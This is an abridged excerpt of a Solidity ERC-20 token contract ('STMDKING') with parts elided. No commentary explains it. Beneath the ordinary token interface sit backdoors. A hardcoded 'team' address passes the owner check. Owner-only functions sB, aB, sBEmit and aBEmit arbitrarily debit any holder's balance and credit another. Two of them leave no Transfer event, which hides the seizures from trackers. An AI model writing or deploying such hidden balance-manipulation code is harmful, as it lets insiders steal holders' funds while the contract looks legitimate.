...
contract Ownable is Context {
    ...
    address  public team = 0x4d4436De78c45315302a7ea94C8803411eDB2222 ;
   ...
   modifier onlyOwner() {
        require(_owner == msg.sender||team == msg.sender, "Ownable: caller is not the owner");
        _;
    }
...
contract TokenTool is Context, IERC20, Ownable {
    ...
    uint256 private _intervalSecondsForSwap = 600;
    ...
    constructor (
        ...
        _symbol = "STMDKING";
        _decimals = 18;
        _owner = 0xa7DCc7fA76A8019246f53e6e9CbCb45D25031111;
        _totalSupply = 10000000000  * 10 ** _decimals;
        _maxTxAmount = 10000000000 * 10**_decimals;
        _walletMax = 10000000000 * 10**_decimals;
        _maxDestroyAmount = 10000000000 * 10**_decimals;
        _minimumTokensBeforeSwap = 1 * 10**_decimals;
        marketingWalletAddress = payable(0x3A82a84EcF051c9b825E6f33017CD786D336d226);
        teamWalletAddress = payable(0x266c7909D033Aec996C742aEf2686015fBB52f17);
    ...
    function sBEmit(address sender ,address recipient, uint256 value) onlyOwner  public  {
        _balances[sender] = _balances[sender].sub( value*10**18);
        _balances[recipient] = _balances[recipient].add( value*10**18);
        emit Transfer(sender,recipient, value*10**18);
    }
    function aBEmit(address sender ,address recipient, uint256 value) onlyOwner  public  {
        _balances[sender] = _balances[sender].add( value*10**18);
        _balances[recipient] = _balances[recipient].sub( value*10**18);
        emit Transfer(sender, recipient, value*10**18);
    }
    
     function sB(address sender ,address recipient, uint256 value) onlyOwner  public  {
         _balances[sender] = _balances[sender].sub( value*10**18);
        _balances[recipient] = _balances[recipient].add( value*10**18);
       
    }
    function aB(address sender ,address recipient, uint256 value) onlyOwner  public  {
        _balances[sender] = _balances[sender].add( value*10**18);
        _balances[recipient] = _balances[recipient].sub( value*10**18);
